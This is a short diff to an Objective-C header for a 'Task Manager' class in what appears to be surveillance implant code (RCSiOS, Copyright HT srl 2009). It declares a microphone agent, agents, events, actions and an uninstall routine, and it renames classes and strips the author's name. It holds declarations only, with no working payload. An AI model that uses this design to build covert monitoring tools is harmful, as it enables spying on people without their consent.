@@ -1,11 +1,11 @@
 /*
- * RCSIpony - Task Manager
+ * RCSiOS - Task Manager
  *  This class will be responsible for managing all the operations within
  *  Events/Actions/Agents, thus the Core will have to deal with them in the
  *  most generic way.
  * 
  *
- * Created by Alfredo 'revenge' Pesoli on 10/04/2009
+ * Created on 10/04/2009
  * Copyright (C) HT srl 2009. All rights reserved
  *
  */
@@ -17,8 +17,8 @@
 
 @class RCSIAgentMicrophone;
 @class RCSIConfManager;
-@class RCSIEvents;
-@class RCSIActions;
+@class RCSIEventManager;
+@class RCSIActionManager;
 @class RCSISharedMemory;
 @class RCSILogManager;
 
@@ -37,7 +37,7 @@
   
 @private
   RCSIConfManager   *mConfigManager;
-  RCSIActions       *mActions;
+  RCSIActionManager       *mActions;
   RCSISharedMemory  *mSharedMemory;
 }
 
@@ -57,9 +57,9 @@
 - (void)release;
 - (id)autorelease;
 
-- (BOOL)loadInitialConfiguration;
-- (BOOL)updateConfiguration: (NSMutableData *)aConfigurationData;
-- (BOOL)reloadConfiguration;
+//- (BOOL)loadInitialConfiguration;
+//- (BOOL)updateConfiguration: (NSMutableData *)aConfigurationData;
+//- (BOOL)reloadConfiguration;
 - (void)uninstallMeh;
 
 - (BOOL)startAgent: (u_int)agentID;
@@ -73,7 +73,6 @@
 
 - (BOOL)startEventsMonitors;
 - (BOOL)stopEvents;
-- (BOOL)startEvents;
 
 - (BOOL)triggerAction: (int)anActionID;
 
@@ -100,7 +99,6 @@
 
 - (NSMutableArray*)getCopyOfEvents;
 - (void)removeAllElements;
-- (void)checkManagersAndRestart;
 
 @end
 
